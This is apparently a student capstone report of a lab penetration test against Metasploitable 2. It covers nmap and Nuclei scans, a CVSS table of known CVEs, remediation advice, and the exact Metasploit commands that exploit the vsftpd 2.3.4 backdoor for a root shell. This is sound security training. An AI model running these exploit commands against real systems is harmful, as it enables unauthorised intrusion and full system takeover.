## Capstone Project — Full VAPT Engagement
# Overview

This capstone simulates a full Vulnerability Assessment and Penetration Testing (VAPT) engagement against a deliberately vulnerable Linux system. The assessment follows PTES methodology, covering reconnaissance, automated scanning, exploitation, post-exploitation, remediation, and validation. Findings were correlated across tools to demonstrate real-world attack paths and business impact.

# Objectives

Perform end-to-end VAPT using industry tools

Identify and prioritize vulnerabilities using CVSS

Exploit critical findings to validate impact

Provide actionable remediation and validation guidance

Produce executive-level and technical reporting

# Environment
| Component   | Details                                       |
| ----------- | --------------------------------------------- |
| Attacker    | Kali Linux                                    |
| Target      | Metasploitable 2                              |
| Target IP   | `192.168.56.101`                              |
| Tools       | Metasploit, Burp Suite, **Nuclei**, Wireshark |
| Methodology | PTES                                          |

Note: Nuclei was used as the primary vulnerability scanner in place of OpenVAS due to its up-to-date CVE coverage and faster validation.

# Methodology (PTES)

Reconnaissance & Enumeration

Vulnerability Scanning (Automated)

Exploitation & Validation

Post-Exploitation

Remediation

Validation / Rescan

# Phase 1 — Reconnaissance & Enumeration

Commands:

ping 192.168.56.101

nmap -sS -sV -sC 192.168.56.101

Key Services Identified

FTP (vsftpd 2.3.4)

SSH

HTTP (Apache / PHP)

PostgreSQL

Tomcat AJP (8009)

VNC

# Phase 2 — Vulnerability Scanning (Nuclei)

Command:

nuclei -u http://192.168.56.101 -severity critical,high,medium


Highlights:

Multiple RCE-class findings

Weak/default credentials

Exposed services and legacy protocols

# Vulnerability & CVSS Table
| ID    | Vulnerability             | CVE / Template | Severity | CVSS v3.1 | Vector                              | Evidence              |
| ----  | ------------------------- | -------------- | -------- | --------- | ----------------------------------- | --------------------- |
| V-01  | VSFTPD Backdoor RCE       | CVE-2011-2523  | Critical | 9.8       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Service version 2.3.4 |
| V-02  | Tomcat Ghostcat           | CVE-2020-1938  | Critical | 9.8       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | AJP 8009 exposed      |
| V-03  | PHP-CGI RCE               | CVE-2012-1823  | High     | 8.1       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | Crafted query         |
| V-04  | PostgreSQL Empty Password | —              | Critical | 9.1       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | Auth bypass           |
| V-05  | DistCC RCE                | CVE-2004-2687  | High     | 8.8       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Service exposed       |
| V-06  | VNC Default Credentials   | —              | High     | 8.6       | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | Default creds         |
| V-07  | FTP Anonymous Login       | —              | Medium   | 6.5       | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N | Anonymous enabled     |
| V-08  | Weak SSH Algorithms       | —              | Medium   | 5.3       | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N | Legacy ciphers        |

# Phase 3 — Exploitation (Validated)
Exploit: VSFTPD Backdoor (RCE)

Metasploit Execution

msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 192.168.56.101

run


Result:

UID: uid=0(root)
Command shell session opened

# Exploitation Log (Required)

Timestamp            | Target IP        | Vulnerability | PTES Phase
2026-01-21 11:25:10  | 192.168.56.101   | VSFTPD RCE    | Exploitation

🧠 Phase 4 — Post-Exploitation

Verified root access

Enumerated system users and services

Confirmed feasibility of lateral movement

Collected proof for impact validation

# Phase 5 — Remediation Plan
| Vulnerability        | Recommendation                 | Priority  |
| -------------------- | ------------------------------ | --------- |
| VSFTPD 2.3.4         | Upgrade or disable FTP         | Immediate |
| Tomcat AJP           | Disable AJP or restrict access | Immediate |
| PostgreSQL Weak Auth | Enforce strong passwords       | Immediate |
| DistCC               | Remove unused service          | High      |
| VNC Default Creds    | Change creds / restrict access | High      |
| FTP Anonymous        | Disable anonymous login        | Medium    |
| Weak SSH             | Enforce modern ciphers         | Medium    |

# Phase 6 — Validation / Rescan

A targeted validation scan was performed using Nuclei after documenting remediation steps to confirm exposure and prioritize fixes. Critical findings (RCE and weak authentication) were confirmed, emphasizing the urgency of remediation and providing a baseline for risk reduction tracking.

# Reporting

A full VAPT engagement was conducted against the target system following PTES methodology. Automated scanning using Nuclei identified multiple critical and high-risk vulnerabilities, including remote code execution, weak authentication, and exposed legacy services. These findings were validated through controlled exploitation, resulting in root-level access and demonstrating severe business risk. The assessment highlights systemic security weaknesses, lack of patch management, and insufficient service hardening. Actionable remediation steps were provided, and a validation scan was conducted to confirm exposure and guide prioritization. Immediate remediation is required to prevent unauthorized access, data compromise, and service disruption.

Attack Timeline
Recon → Nuclei Scan → CVE Correlation → VSFTPD Exploit → Root Access → Post-Exploit → Remediation → Validation

The security assessment revealed serious weaknesses that allow attackers to fully take control of the system without credentials. Several services were outdated or misconfigured, enabling remote attackers to gain administrator access. These issues pose a high risk to confidentiality, integrity, and availability. Immediate actions include patching vulnerable services, disabling unnecessary components, enforcing strong authentication, and monitoring network activity. Addressing these findings will significantly reduce the likelihood of breach and operational impact.
